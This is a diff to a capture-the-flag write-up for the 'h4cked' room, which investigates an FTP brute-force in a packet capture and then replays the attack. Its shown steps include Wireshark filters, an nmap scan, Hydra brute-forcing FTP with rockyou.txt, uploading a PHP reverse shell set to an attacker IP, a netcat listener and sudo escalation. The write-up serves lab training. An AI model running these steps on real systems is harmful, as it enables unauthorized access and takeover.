@@ -20,12 +20,22 @@ h4cked starts as a packet capture investigation and then turns into a replay exe
 Tools used:
 
 - Wireshark
+- Nmap
 - Hydra
 - FTP
 - Netcat
 
 ## 2. PCAP Triage
-I started by opening the provided `.pcap` in Wireshark and checking the traffic patterns. FTP traffic stood out straight away, and the packet stream showed a brute-force style login attempt.
+I started by opening the provided `.pcap` in Wireshark and checking the traffic patterns. Port `21` traffic stood out, and the packet stream showed a brute-force style login attempt against FTP.
+
+Useful filters for this room:
+
+```text
+ftp
+tcp.port == 21
+ftp.request.command == "USER" || ftp.request.command == "PASS"
+ftp.request.command == "PWD" || ftp.request.command == "STOR"
+```
 
 The service was:
 
@@ -116,7 +126,13 @@ Reptile is a Linux kernel rootkit, so the backdoor type is:
 ## 5. Replaying The Attack
 Task 2 asks us to hack back into the live machine. The attacker changed Jenny's password, so the password from the PCAP is useful context but not the final login.
 
-I started with Hydra against FTP:
+I started with a full port scan to confirm the exposed services:
+
+```bash
+nmap -A -T4 -Pn -p- <TARGET_IP>
+```
+
+The important result for this path is FTP. Once I knew FTP was open, I ran Hydra against Jenny with `rockyou.txt`:
 
 ```bash
 hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
@@ -143,14 +159,20 @@ ftp> get shell.php
 ftp> put shell.php
 ```
 
-The PHP reverse shell needs your AttackBox or VPN IP:
+The PHP reverse shell needs your AttackBox or VPN IP. If you are using OpenVPN, use the `tun0` address:
+
+```bash
+ifconfig tun0
+```
+
+Then update the listener values in `shell.php`:
 
 ```php
 $ip = '<ATTACKER_IP>';
 $port = 4444;
 ```
 
-With the shell uploaded, I started a listener:
+With the shell uploaded, I started a listener before triggering it:
 
 ```bash
 nc -lvnp 4444
@@ -166,6 +188,7 @@ Once the reverse shell connected, I upgraded the TTY and used the same privilege
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+sudo -l
 sudo su
 ```
 
